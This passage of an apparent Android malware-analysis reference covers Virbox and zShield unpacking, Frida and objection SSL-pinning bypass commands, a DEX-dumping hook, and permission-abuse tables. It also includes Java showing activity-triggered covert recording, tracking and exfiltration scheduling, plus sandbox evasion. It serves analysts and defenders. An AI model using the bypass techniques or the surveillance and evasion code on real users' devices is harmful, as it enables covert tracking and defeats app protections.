<li>AndroidManifest.xml: permissions, components, intent filters</li> <li>Non-virtualized Activities and Services: application flow, UI logic</li> <li>Resource files: strings.xml (may contain URLs, configuration), layouts</li> <li>Receiver registrations: broadcast-based triggers</li> </ul> <p>Step 4: Set Up Dynamic Analysis Environment</p> <p>Prepare a rooted device or emulator with RASP bypass scripts loaded. Use spawn mode with Frida to inject the RASP bypass before Virbox's checks execute:</p> <pre><code>frida -U -f com.target.package -l rasp_bypass.js --no-pause\n</code></pre> <p>Use reFrida to reduce Frida's detection footprint. Load the <code>System.exit</code> and <code>Runtime.exit</code> blockers first, then layer additional hooks.</p> <p>Step 5: Network Traffic Capture</p> <p>Set up mitmproxy or Burp Suite as the device proxy. Use objection or a Frida script for SSL pinning bypass:</p> <pre><code>objection -g com.target.package explore -s \"android sslpinning disable\"\n</code></pre> <p>Run the application through its full workflow. Capture all HTTP/HTTPS requests. C2 endpoints, exfiltration URLs, and command protocols are visible in cleartext after SSL bypass regardless of Virbox protection.</p> <p>Step 6: Behavioral Hooking</p> <p>Deploy Frida hooks for the behavioral observation points described in the Partial Analysis Strategy section. Focus on:</p> <ul> <li>Network calls (URL construction, HTTP requests)</li> <li>File system operations (credential storage, configuration drops)</li> <li>IPC (inter-component communication, broadcasts)</li> <li>Accessibility events (if the malware uses AccessibilityService)</li> <li>SMS operations (interception, exfiltration)</li> </ul> <p>Step 7: Report and Indicator Extraction</p> <p>Compile findings into actionable intelligence:</p> <ul> <li>Network IOCs: C2 domains, IP addresses, URL patterns</li> <li>File system IOCs: dropped file names, paths, hashes</li> <li>Behavioral IOCs: permission abuse patterns, accessibility actions</li> <li>Infrastructure mapping: shared hosting, certificate reuse, domain registration patterns</li> </ul>"},{"location":"packers/virbox/#decision-tree","title":"Decision Tree","text":"<pre><code>Is libvirbox_*.so present?\n\u251c\u2500\u2500 No \u2192 Not Virbox-protected, use standard analysis\n\u2514\u2500\u2500 Yes \u2192 Virbox confirmed\n    \u2502\n    Does jadx decompile application methods?\n    \u251c\u2500\u2500 Most methods readable \u2192 Partially virtualized\n    \u2502   \u251c\u2500\u2500 Analyze non-virtualized code statically\n    \u2502   \u251c\u2500\u2500 Focus dynamic analysis on virtualized methods\n    \u2502   \u2514\u2500\u2500 Cross-reference static and dynamic findings\n    \u2514\u2500\u2500 Most methods are native stubs \u2192 Fully virtualized\n        \u251c\u2500\u2500 Skip static code analysis\n        \u251c\u2500\u2500 Go fully dynamic\n        \u251c\u2500\u2500 Focus on network traffic capture\n        \u251c\u2500\u2500 Deploy behavioral hooks\n        \u2514\u2500\u2500 Extract IOCs from observable behavior\n</code></pre>"},{"location":"packers/virbox/#tool-selection","title":"Tool Selection","text":"Tool Purpose reFrida Frida with reduced detection footprint for hooking Virbox-protected apps frida-dexdump Dump non-virtualized DEX from memory (limited against virtualized methods) mitmproxy Transparent HTTP/HTTPS proxy for C2 extraction objection SSL pinning bypass, runtime exploration jadx Decompile non-virtualized portions, manifest analysis APKiD Identify Virbox and determine protection type Ghidra Analyze <code>libvirbox_*.so</code> native library (VM interpreter RE)"},{"location":"packers/virbox/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Dimension Virbox DexGuard DexProtector Arxan (Digital.ai) Chinese Packers Origin China (SenseShield) Belgium (Guardsquare) USA (Licel) USA (Digital.ai) China (various) DEX Protection Virtualization + Encryption Encryption + Obfuscation Encryption + Native bridge Obfuscation + Guard network Encryption (mostly) VM-based Protection Yes (core feature) No No No Rare (some Tencent Legu variants) Native Protection Code encryption + Virtualization Limited vtable hooking Guard mesh + Obfuscation Basic encryption RASP Anti-debug, root, emulator, injection Anti-tamper, root, debug Full RASP suite (EMVCo certified) Environmental checks, tamper detection Basic anti-debug Unpacking Difficulty Very high (virtualization) Medium (encryption recoverable) Medium-high (native bridge) High (guard network) Low-medium (well-documented) frida-dexdump Effective? No (virtualized methods) Partially Partially N/A (obfuscation, not encryption) Yes (most families) Static Analysis Infeasible for VM code Possible after deobfuscation Possible after decryption Difficult but possible Possible after unpacking Malware Adoption GoldFactory, Klopatra, Gigabud Widespread across families Occasional Rare in malware Dominant in Chinese malware Build Integration Post-build (APK input) Gradle plugin (source required) Post-build (APK/AAB input) Build-time + Post-build Post-build (APK upload) Cost to Attacker Commercial license required Commercial license required Commercial license required Commercial license required Free or cheap Google Play Compatibility Limited (DEX encryption may fail checks) Full Full Full Limited"},{"location":"packers/virbox/#references","title":"References","text":"<ul> <li>Virbox Protector Documentation</li> <li>Virbox Android Protection</li> <li>Virbox Best Practices</li> <li>SenseShield GitHub</li> <li>Klopatra Analysis - Cleafy Labs</li> <li>Gigabud Threat Network - Zimperium zLabs</li> <li>GoldDigger and Gigabud Overlap - Cyble</li> <li>Gigabud Banking Malware - Group-IB</li> <li>GoldFactory Threat Group - Group-IB</li> <li>GoldPickaxe iOS Trojan - Group-IB</li> <li>ESET H1 2024 Threat Report - GoldDigger/GoldFactory</li> <li>ThreatFabric 2024 Mobile Threat Landscape</li> <li>Gigabud RAT - Cyble (Initial Discovery)</li> </ul>"},{"location":"packers/zshield/","title":"Zimperium zShield","text":"<p>zShield is the application hardening and protection component of Zimperium's MAPS (Mobile Application Protection Suite). It applies binary-level obfuscation, encryption, and runtime protection to Android and iOS applications. zShield is distinct from Zimperium's other products: zIPS (device-level MTD agent), zDefend (embeddable RASP SDK for third-party apps), and zKeyBox (white-box cryptography).</p>"},{"location":"packers/zshield/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Zimperium Origin Dallas, Texas, USA Type Commercial Protector/Obfuscator (part of MAPS suite) Platforms Android, iOS Suite Components zShield (app hardening), zScan (app security testing), zDefend (in-app RASP SDK), zKeyBox (white-box crypto) Acquisition whiteCryption acquired by Zimperium in 2021 (source of zKeyBox)"},{"location":"packers/zshield/#maps-suite-context","title":"MAPS Suite Context","text":"<p>Zimperium's MAPS suite addresses different layers of mobile security. Understanding the distinctions matters for accurate identification:</p> Product Function Deployment zShield Binary protection, obfuscation, encryption Build-time, applied to APK/IPA zIPS Mobile Threat Defense agent (device-level) Standalone app on managed devices zDefend RASP SDK embedded in third-party apps SDK integrated at build time zKeyBox White-box cryptography library SDK/library integration zScan Automated app security scanning Cloud-based analysis <p>zShield is the component relevant to reverse engineering and unpacking. zDefend and zIPS are endpoint protection products, not application protectors.</p>"},{"location":"packers/zshield/#identification","title":"Identification","text":""},{"location":"packers/zshield/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies zShield through segment-based analysis of native libraries:</p> <pre><code>packer : Zimperium (zShield)\nanti_hook : syscalls\n</code></pre> <p>The segment-based detection is significant because it works regardless of the randomized library naming that zShield applies to its native components.</p>"},{"location":"packers/zshield/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native libraries Randomized names (e.g., <code>liboptipkawfn.so</code>), ~3MB, packed/encrypted ELF Asset files <code>assets/&lt;randomstring&gt;/0.odex</code> -- truncated to 17-41 bytes .szip assets ~8MB files containing encrypted and compressed DEX bytecode Library naming Substring between <code>lib</code> and <code>.so</code> is randomized between builds"},{"location":"packers/zshield/#randomized-library-naming","title":"Randomized Library Naming","text":"<p>zShield randomizes native library filenames on each build. Examples observed across different protected applications:</p> <pre><code>liboptipkawfn.so\nlibxqwemnzrvt.so\nlibhgkdpfyauc.so\n</code></pre> <p>The randomized substring changes between builds of the same application. This defeats static file-based detection rules that match on fixed library names, but APKiD's segment-based ELF analysis detects zShield regardless because it examines the binary structure rather than the filename.</p>"},{"location":"packers/zshield/#asset-structure","title":"Asset Structure","text":"<p>Protected applications contain asset files in a randomized directory:</p> <pre><code>assets/a8f3c2d1e9/0.odex     (17-41 bytes, truncated)\nassets/a8f3c2d1e9/data.szip  (~8MB, encrypted+compressed DEX)\n</code></pre> <p>The <code>0.odex</code> file is intentionally truncated and serves as a marker or metadata stub. The <code>.szip</code> files contain the actual encrypted and compressed DEX bytecode that is unpacked at runtime.</p>"},{"location":"packers/zshield/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/zshield/#elf-self-decryption-xxtea","title":"ELF Self-Decryption (XXTEA)","text":"<p>The native libraries ship with their ELF body encrypted using the XXTEA cipher. At load time, the library's initialization code decrypts itself before execution. XXTEA is a lightweight block cipher that provides fast decryption with minimal code footprint -- suitable for a self-decrypting stub but not cryptographically strong by modern standards.</p>"},{"location":"packers/zshield/#ollvm-style-control-flow-flattening","title":"OLLVM-Style Control Flow Flattening","text":"<p>After the ELF body is decrypted, the underlying native code uses OLLVM-style control flow flattening. Original control flow structures (if/else, loops, switch) are transformed into a state-machine dispatcher pattern where a central loop reads a state variable and dispatches to the appropriate basic block. This defeats pattern-based decompilation in Ghidra and IDA Pro, producing unreadable switch-based control flow graphs.</p>"},{"location":"packers/zshield/#string-and-buffer-encryption","title":"String and Buffer Encryption","text":"<p>Strings and data buffers within native libraries are encrypted using a weak cipher with a 32-bit key. The encryption is applied at the individual string/buffer level, with decryption routines called inline before each use. The 32-bit key space makes brute-force feasible if the cipher and ciphertext can be extracted from the binary.</p>"},{"location":"packers/zshield/#dex-protection","title":"DEX Protection","text":"<p>DEX bytecode is encrypted and compressed into <code>.szip</code> asset files. At runtime, the native library unpacks and decrypts these assets, loading the recovered DEX into the Dalvik/ART runtime. The original <code>classes.dex</code> in the APK contains only stub code that bootstraps the native library and triggers DEX unpacking.</p>"},{"location":"packers/zshield/#obfuscation-layers","title":"Obfuscation Layers","text":"Layer Target Class/field/method renaming Java/Kotlin identifiers Native library name randomization <code>.so</code> filenames Resource name obfuscation Android resource identifiers Symbol stripping Native library exports"},{"location":"packers/zshield/#anti-debugging","title":"Anti-Debugging","text":"<p>Detects debugging through ptrace status checks, TracerPid monitoring in <code>/proc/self/status</code>, and detection of known debugger processes (IDA, gdb, lldb, jeb).</p>"},{"location":"packers/zshield/#anti-hooking-syscall-based","title":"Anti-Hooking (Syscall-Based)","text":"<p>zShield uses direct syscalls rather than libc wrappers for security-critical operations. This bypasses Frida's <code>Interceptor.attach</code> on libc functions like <code>open</code>, <code>read</code>, <code>fopen</code> because the hooked libc functions are never called. The syscall-based approach is identified by APKiD as <code>anti_hook : syscalls</code>.</p>"},{"location":"packers/zshield/#integrity-checks","title":"Integrity Checks","text":"<p>Runtime verification of APK signatures, DEX checksums, and native library integrity. Detects repackaging and binary modification.</p>"},{"location":"packers/zshield/#ssl-pinning","title":"SSL Pinning","text":"<p>Certificate pinning implementation that validates server certificates against embedded pins, independent of Android's <code>NetworkSecurityConfig</code>.</p>"},{"location":"packers/zshield/#frida-detection-via-procnetunix","title":"Frida Detection via /proc/net/unix","text":"<p>zShield scans <code>/proc/net/unix</code> for Frida-related Unix domain sockets. When frida-server is running on a device, it creates Unix domain sockets that appear in this procfs file. The scan looks for socket paths containing <code>frida</code>, <code>linjector</code>, or other Frida-associated strings.</p> <p>This detection vector is well-documented and bypassable by either:</p> <ul> <li>Renaming Frida's socket paths (custom Frida build)</li> <li>Hooking the <code>open</code> syscall at the kernel level</li> <li>Using a Frida build that avoids creating identifiable sockets</li> </ul>"},{"location":"packers/zshield/#unpacking-methodology","title":"Unpacking Methodology","text":""},{"location":"packers/zshield/#xxtea-elf-unpacker-david-buchanan","title":"XXTEA ELF Unpacker (David Buchanan)","text":"<p>David Buchanan (DavidBuchanan314) published an analysis of the Rabbit R1 device APK that was protected by zShield. The analysis included an XXTEA unpacker that strips the ELF encryption layer from zShield's native libraries.</p> <p>The unpacker targets the self-decryption stub, extracting the XXTEA key from the initialization routine and decrypting the ELF body. After unpacking:</p> <ul> <li>The ELF structure is restored and loadable in Ghidra/IDA</li> <li>Function boundaries become identifiable</li> <li>The code remains control-flow flattened (OLLVM-style)</li> <li>Strings remain individually encrypted with the 32-bit key cipher</li> </ul> <p>The XXTEA layer is the outermost protection. Removing it is necessary but not sufficient for full analysis.</p>"},{"location":"packers/zshield/#post-xxtea-analysis","title":"Post-XXTEA Analysis","text":"<p>After removing the XXTEA encryption, the analyst faces two remaining layers:</p> <p>Control flow flattening: The OLLVM-style dispatcher pattern must be manually or semi-automatically deflattened. Tools like D-810 (IDA plugin) or custom Ghidra scripts can partially recover original control flow, but results vary by sample.</p> <p>String encryption: With a 32-bit key space, the string cipher is brute-forceable if the cipher algorithm and ciphertext can be identified within the binary. Alternatively, dynamic analysis with Frida can intercept decrypted strings at runtime.</p>"},{"location":"packers/zshield/#bypassing-syscall-based-anti-hooking","title":"Bypassing Syscall-Based Anti-Hooking","text":"<p>The syscall-based approach prevents standard libc hooking but has limitations:</p> <ul> <li>Kernel-level hooking (requires root) can intercept syscalls</li> <li>The syscall numbers are architecture-specific and identifiable in the binary</li> <li>Patching the native library to replace syscall instructions with libc calls re-enables standard Frida hooking (requires defeating integrity checks first)</li> </ul>"},{"location":"packers/zshield/#dex-recovery","title":"DEX Recovery","text":"<p>The encrypted DEX in <code>.szip</code> assets can potentially be recovered by:</p> <ol> <li>Allowing the native library to perform decryption</li> <li>Hooking the class loading mechanism to intercept decrypted DEX data</li> <li>Using frida-dexdump after the application has fully initialized and DEX has been loaded into the ART runtime</li> </ol> <pre><code>Java.perform(function() {\n    var DexFile = Java.use(\"dalvik.system.DexFile\");\n    var InMemoryDexClassLoader = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n\n    InMemoryDexClassLoader.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\").implementation = function(buf, parent) {\n        var size = buf.remaining();\n        console.log(\"[zShield] InMemoryDexClassLoader loading DEX, size: \" + size);\n        var bytes = new Uint8Array(size);\n        for (var i = 0; i &lt; size; i++) {\n            bytes[i] = buf.get(buf.position() + i) &amp; 0xff;\n        }\n        var f = new File(\"/data/local/tmp/zshield_dex_\" + size + \".dex\", \"wb\");\n        f.write(bytes.buffer);\n        f.close();\n        console.log(\"[zShield] DEX dumped to /data/local/tmp/zshield_dex_\" + size + \".dex\");\n        return this.$init(buf, parent);\n    };\n});\n</code></pre>"},{"location":"packers/zshield/#zkeybox-white-box-cryptography","title":"zKeyBox White-Box Cryptography","text":"<p>zKeyBox is Zimperium's white-box cryptography solution, acquired through the whiteCryption purchase in 2021. While separate from zShield's application protection, it is often deployed alongside zShield in financial applications.</p> <p>White-box cryptography embeds cryptographic keys into the code itself, making them resistant to extraction even when the attacker has full access to the binary and runtime. zKeyBox supports standard algorithms (AES, RSA, ECC) with keys that are mathematically dissolved into lookup tables and code transformations.</p> <p>For reverse engineers, zKeyBox-protected cryptographic operations are the hardest component to break. The keys do not exist as extractable byte sequences anywhere in memory or on disk -- they are distributed across transformation tables.</p>"},{"location":"packers/zshield/#industry-usage","title":"Industry Usage","text":"<p>zShield is deployed in enterprise mobile applications and specialized devices:</p> <ul> <li>Enterprise MDM/EMM-managed applications</li> <li>Rabbit R1 device firmware (documented by David Buchanan)</li> <li>Financial services applications (alongside zKeyBox)</li> <li>Government and defense mobile applications</li> </ul> <p>zShield has not been observed protecting malware samples. Zimperium's licensing model and enterprise sales process make it impractical for malware authors.</p>"},{"location":"packers/zshield/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature zShield DexGuard Appdome Arxan ELF encryption XXTEA self-decryption Limited native obfuscation Native library encryption Guard mesh Control flow OLLVM-style flattening Optional flattening Basic obfuscation Guard network DEX protection Encrypted .szip assets Class/string encryption DEX encryption Obfuscation Library naming Randomized per build Fixed (<code>libdexguard.so</code>) Fixed (<code>libloader.so</code>) Fixed naming Anti-hooking Direct syscalls libc-based detection Multi-vector Guard-based String encryption 32-bit key cipher (native) AES/XOR (DEX level) Native layer Native layer White-box crypto zKeyBox (separate product) No No TransformIT Public unpacker Yes (XXTEA layer only) Frida-based None None Malware adoption None Cracked versions in malware None Rare"},{"location":"packers/zshield/#references","title":"References","text":"<ul> <li>Zimperium MAPS Platform</li> <li>Zimperium zShield</li> <li>Zimperium zKeyBox (whiteCryption)</li> <li>APKiD -- Android Application Identifier</li> <li>David Buchanan -- Rabbit R1 Analysis</li> <li>APKiD zShield Detection Signatures</li> <li>Zimperium whiteCryption Acquisition (2021)</li> <li>OLLVM -- Obfuscator-LLVM</li> </ul>"},{"location":"permissions/","title":"Android Permissions","text":"<p>Android's permission system controls access to sensitive data and device capabilities. Permissions define what an app can do once installed, and what an attacker gains when a user grants them.</p> <p>This section covers permissions across all protection levels relevant to security research, not just the \"dangerous\" category.</p>"},{"location":"permissions/#permission-categories","title":"Permission Categories","text":""},{"location":"permissions/#dangerous-permissions-runtime","title":"Dangerous Permissions (Runtime)","text":"<p>Require explicit user grant. Most malware requests several of these.</p> Category Abuse Scenarios Calendar Event data exfiltration, schedule reconnaissance Call Log Call history theft, contact mapping Camera Covert photo/video capture Contacts Contact exfiltration, social graph mapping Location Real-time tracking, geofencing Microphone Audio surveillance Phone IMEI harvesting, call interception, premium dialing Sensors Biometric data theft Activity Recognition User behavior profiling SMS OTP interception, premium SMS fraud, C2 channel Storage File exfiltration, payload dropping Nearby Devices Device tracking, proximity attacks"},{"location":"permissions/#special-permissions","title":"Special Permissions","text":"<p>Require a settings toggle rather than a runtime dialog. Some of the most powerful permissions available.</p> Category Abuse Scenarios Special Permissions Overlay attacks, accessibility takeover, silent app installs, notification interception"},{"location":"permissions/#normal-permissions-auto-granted","title":"Normal Permissions (Auto-Granted)","text":"<p>Granted silently at install time. Often overlooked but critical for malware operation.</p> Category Abuse Scenarios Normal (Abusable) Boot persistence, C2 communication, app enumeration, battery optimization bypass"},{"location":"permissions/#permission-escalation-patterns","title":"Permission Escalation Patterns","text":"<p>Malware rarely requests all permissions at install. Instead, it escalates through stages:</p> Stage Permissions Technique Install <code>INTERNET</code>, <code>RECEIVE_BOOT_COMPLETED</code>, <code>WAKE_LOCK</code> Normal permissions, auto-granted, establish persistence and C2 Social engineering <code>BIND_ACCESSIBILITY_SERVICE</code> Instructs user to enable in Settings, often with fake security prompts Accessibility-granted <code>SYSTEM_ALERT_WINDOW</code>, <code>WRITE_SETTINGS</code>, <code>REQUEST_INSTALL_PACKAGES</code> Accessibility service clicks through permission dialogs automatically Runtime prompts <code>SMS</code>, <code>CONTACTS</code>, <code>PHONE</code>, <code>CAMERA</code> Granted via fake explanations or accessibility auto-grant Special <code>BIND_DEVICE_ADMIN</code>, <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Enabled via Settings or accessibility for maximum device control <p>Accessibility abuse is the key escalation vector. Once granted, it can auto-approve every other permission dialog, making it the single most critical permission for malware operations.</p>"},{"location":"permissions/#android-version-impact","title":"Android Version Impact","text":"Version Permission Change Impact on Malware Android 6 (API 23) Runtime permissions introduced Malware must request dangerous permissions individually Android 8 (API 26) Background execution limits Requires <code>FOREGROUND_SERVICE</code> for persistent operation Android 10 (API 29) Background location restricted Requires <code>ACCESS_BACKGROUND_LOCATION</code> as separate grant Android 11 (API 30) Auto-revoke unused permissions, scoped storage Malware must maintain active usage or request <code>MANAGE_EXTERNAL_STORAGE</code> Android 12 (API 31) Approximate location option, Bluetooth permissions split Additional permission prompts for location and nearby devices Android 13 (API 33) Notification permission required, media permissions split Must request <code>POST_NOTIFICATIONS</code> explicitly Android 14 (API 34) Restricted implicit intents, foreground service types required Must declare specific <code>foregroundServiceType</code> Android 15 (API 35) Restricted settings enforcement Multi-step process to enable accessibility for sideloaded apps"},{"location":"permissions/#minimum-viable-permission-sets","title":"Minimum Viable Permission Sets","text":"<p>The smallest permission set that enables each malware category:</p> Malware Type Minimum Permissions Banking trojan (overlay) <code>INTERNET</code> + <code>SYSTEM_ALERT_WINDOW</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> + <code>RECEIVE_SMS</code> Banking trojan (ATS) <code>INTERNET</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> Spyware <code>INTERNET</code> + <code>CAMERA</code> + <code>RECORD_AUDIO</code> + <code>ACCESS_FINE_LOCATION</code> + <code>READ_CONTACTS</code> SMS fraud <code>INTERNET</code> + <code>SEND_SMS</code> + <code>RECEIVE_SMS</code> Ransomware <code>INTERNET</code> + <code>BIND_DEVICE_ADMIN</code> + storage permissions Clipper <code>INTERNET</code> + <code>BIND_ACCESSIBILITY_SERVICE</code> (or foreground clipboard access) <p>Medusa v2 demonstrated the trend toward reduced permission footprints, dropping from 21 to 5 permissions while maintaining full functionality by relying more heavily on accessibility services for capabilities that previously required dedicated permissions.</p>"},{"location":"permissions/activity-recognition/","title":"Activity Recognition Permissions","text":"<p>Access to physical activity data: whether the user is walking, running, cycling, driving, or stationary. Used in targeted surveillance to build behavioral profiles. Low priority for commodity malware.</p>"},{"location":"permissions/activity-recognition/#permissions","title":"Permissions","text":"Permission Abuse Potential ACTIVITY_RECOGNITION Track user's physical activity state for behavior profiling"},{"location":"permissions/activity-recognition/#exposed-data","title":"Exposed Data","text":"<p>The Activity Recognition API returns <code>DetectedActivity</code> objects, each with a type and confidence score:</p> Activity Type Intelligence Value <code>IN_VEHICLE</code> Target is driving or riding in a vehicle -- reveals commute patterns <code>ON_BICYCLE</code> Cycling activity -- narrows transport mode for physical surveillance <code>ON_FOOT</code> Walking -- baseline movement, often paired with location for route mapping <code>RUNNING</code> Exercise pattern -- reveals routine and predictable locations (gym, park) <code>STILL</code> Stationary -- indicates the target is at a fixed location (home, office, meeting) <code>TILTING</code> Device angle changed -- can infer phone pickup, pocket/table transitions <code>WALKING</code> Subset of ON_FOOT -- more granular movement classification <p>When combined with location data, activity recognition builds comprehensive movement profiles. A surveillance operator can determine not just where a target went, but how they got there, when they stopped, and how long they stayed. This is the difference between a series of GPS dots and an actionable pattern-of-life analysis.</p>"},{"location":"permissions/activity-recognition/#spyware-families","title":"Spyware Families","text":"<p>Several state-sponsored and commercial spyware families request this permission:</p> <ul> <li>Pegasus (NSO Group) -- full activity monitoring as part of its comprehensive device surveillance suite</li> <li>Hermit (RCS Lab) -- collects activity data alongside location for target profiling</li> <li>PlainGnome -- Russian-linked spyware that harvests activity states for behavioral analysis</li> </ul> <p>Commodity malware rarely bothers with this permission. The intelligence it provides is only valuable when an operator is building a sustained profile of a specific target, making it a strong indicator of targeted surveillance rather than bulk data theft.</p>"},{"location":"permissions/activity-recognition/#android-version-history","title":"Android Version History","text":"<p>Prior to Android 10 (API 29), activity recognition data was available to any app using the Google Play Services Activity Recognition API without a dedicated permission. API 29 introduced <code>ACTIVITY_RECOGNITION</code> as a runtime permission, requiring explicit user consent. This change was part of a broader push to gate sensor-derived behavioral data behind granular permissions rather than bundling it under broad grants.</p>"},{"location":"permissions/activity-recognition/activity-recognition/","title":"ACTIVITY_RECOGNITION","text":"<p>Allows detecting the user's physical activity: walking, running, cycling, driving, tilting, or stationary. Uses accelerometer, gyroscope, and other motion sensors to classify movement.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACTIVITY_RECOGNITION</code> Protection Level <code>dangerous</code> Permission Group <code>ACTIVITY_RECOGNITION</code> Grant Method Runtime permission dialog Introduced API 29 (Android 10) <p>Before Android 10, activity recognition data was available without any permission through the Google Activity Recognition API.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>ActivityRecognitionClient</code> (Google Play Services) or <code>SensorManager</code> for motion classification:</p> Activity Detection Still Device stationary Walking Pedestrian movement Running Fast pedestrian movement Cycling Bicycle movement In vehicle Automotive movement Tilting Device orientation change Unknown Unclassified movement"},{"location":"permissions/activity-recognition/activity-recognition/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/activity-recognition/activity-recognition/#behavioral-profiling","title":"Behavioral Profiling","text":"<p>Stalkerware uses activity data to track daily patterns:</p> <ul> <li>When the target leaves home (transitions from still to walking/driving)</li> <li>Commute patterns and timing</li> <li>Exercise routines</li> <li>Sleep schedule (extended still periods)</li> </ul>"},{"location":"permissions/activity-recognition/activity-recognition/#trigger-based-actions","title":"Trigger-Based Actions","text":"<p>Malware can trigger specific actions based on activity state transitions. The <code>ActivityRecognitionClient</code> provides transition callbacks that are ideal for conditional surveillance:</p> <pre><code>ActivityRecognitionClient client = ActivityRecognition.getClient(context);\n\nList&lt;ActivityTransition&gt; transitions = new ArrayList&lt;&gt;();\ntransitions.add(new ActivityTransition.Builder()\n    .setActivityType(DetectedActivity.IN_VEHICLE)\n    .setActivityTransition(ActivityTransition.ACTIVITY_TRANSITION_ENTER)\n    .build());\ntransitions.add(new ActivityTransition.Builder()\n    .setActivityType(DetectedActivity.STILL)\n    .setActivityTransition(ActivityTransition.ACTIVITY_TRANSITION_ENTER)\n    .build());\n\nActivityTransitionRequest request = new ActivityTransitionRequest(transitions);\nIntent intent = new Intent(context, ActivityReceiver.class);\nPendingIntent pendingIntent = PendingIntent.getBroadcast(\n    context, 0, intent, PendingIntent.FLAG_MUTABLE\n);\nclient.requestActivityTransitionUpdates(request, pendingIntent);\n</code></pre> <p>The <code>BroadcastReceiver</code> then triggers surveillance actions based on the detected transition:</p> <pre><code>public class ActivityReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        ActivityTransitionResult result = ActivityTransitionResult.extractResult(intent);\n        for (ActivityTransitionEvent event : result.getTransitionEvents()) {\n            if (event.getActivityType() == DetectedActivity.STILL) {\n                startAudioRecording(context);\n            }\n            if (event.getActivityType() == DetectedActivity.IN_VEHICLE) {\n                startLocationTracking(context);\n                scheduleDataExfiltration(context);\n            }\n        }\n    }\n}\n</code></pre> <p>This allows malware to:</p> <ul> <li>Start location tracking when the user begins driving</li> <li>Activate microphone recording when the user is stationary (in a meeting)</li> <li>Defer data exfiltration until the user is in a vehicle (likely not looking at phone)</li> <li>Adjust polling frequency based on movement state to conserve battery</li> </ul>"},{"location":"permissions/activity-recognition/activity-recognition/#context-enhancement","title":"Context Enhancement","text":"<p>Activity data combined with location creates richer surveillance: not just where someone is, but what they're doing there.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#anti-analysis-and-sandbox-evasion","title":"Anti-Analysis and Sandbox Evasion","text":"<p>Activity recognition can serve as an environment fingerprint. Emulators and sandboxes produce no real activity transitions. Malware can delay payload activation until it detects genuine activity state changes, confirming execution on a real device:</p> <pre><code>client.requestActivityUpdates(5000, pendingIntent);\n</code></pre> <p>If the callback never fires or always returns <code>DetectedActivity.UNKNOWN</code>, the app can assume it is running in a sandbox and suppress malicious behavior.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#notable-families","title":"Notable Families","text":"<p>No major malware families have been publicly documented abusing <code>ACTIVITY_RECOGNITION</code> as a primary capability. However, the permission was only introduced in Android 10, and before that, activity recognition data was freely available without any permission through the Google Activity Recognition API. This means pre-2019 stalkerware and surveillance tools could collect activity data silently.</p> <p>Commercial spyware platforms like Pegasus and Hermit collect comprehensive device state including motion data, but they do so through root-level access or exploitation rather than the <code>ACTIVITY_RECOGNITION</code> permission. Stalkerware families like SpyNote focus on higher-value data (GPS, camera, microphone) and have not been documented adding activity recognition to their collection modules.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#android-version-changes","title":"Android Version Changes","text":"<p>Pre-Android 10: activity recognition data was available without any permission through the Google Activity Recognition API (part of Google Play Services). Any app could silently monitor user activity.</p> <p>Android 10 (API 29): <code>ACTIVITY_RECOGNITION</code> introduced as a runtime permission. Apps targeting API 29+ must request this permission before using <code>ActivityRecognitionClient</code> or the <code>SensorManager</code> step detector/counter. Apps targeting lower API levels can still access the data without the permission, even on Android 10 devices.</p> <p>Android 12 (API 31): apps targeting API 31+ must request the permission regardless of what API level they target. The backward-compatibility exemption was removed.</p> <p>Android 14 (API 34): no significant changes to the permission itself, but Google Play policies increasingly require justification for activity recognition access in app review.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.ACTIVITY_RECOGNITION\" /&gt;\n</code></pre> <p>Expected in fitness, navigation, and transportation apps. Suspicious in apps with no movement-related functionality.</p>"},{"location":"permissions/activity-recognition/activity-recognition/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li><code>ActivityRecognition.getClient()</code> or <code>ActivityRecognitionClient</code> usage</li> <li><code>ActivityTransitionRequest</code> construction with specific transition types</li> <li><code>PendingIntent</code> registered for activity transition callbacks</li> <li><code>DetectedActivity</code> constants used in conditional logic (especially <code>IN_VEHICLE</code>, <code>STILL</code>, <code>ON_FOOT</code>)</li> <li><code>BroadcastReceiver</code> implementations that trigger other permissions (audio recording, location) based on activity state</li> </ul>"},{"location":"permissions/activity-recognition/activity-recognition/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>App registers for activity transition updates immediately after installation</li> <li>Activity state data appearing in network traffic payloads</li> <li>Other surveillance actions (recording, location tracking) triggered only after specific activity transitions</li> <li>App behavior changes between emulator (no transitions) and real device (active transitions)</li> </ul>"},{"location":"permissions/activity-recognition/activity-recognition/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>ACTIVITY_RECOGNITION</code> combined with ACCESS_FINE_LOCATION and RECORD_AUDIO suggests context-aware surveillance. Combined with RECEIVE_BOOT_COMPLETED, the app restarts activity monitoring after every reboot. The most suspicious combination is <code>ACTIVITY_RECOGNITION</code> + <code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code> in an app with no fitness, navigation, or transportation UI.</p>"},{"location":"permissions/calendar/","title":"Calendar Permissions","text":"<p>Access to calendar events, attendees, and reminders. Lower priority for most malware compared to SMS or contacts, but useful for targeted espionage: reading meeting details, attendee lists, and locations reveals a target's schedule and professional contacts.</p>"},{"location":"permissions/calendar/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_CALENDAR Exfiltrate meeting details, schedules, attendee contact info WRITE_CALENDAR Inject fake events for social engineering, modify existing 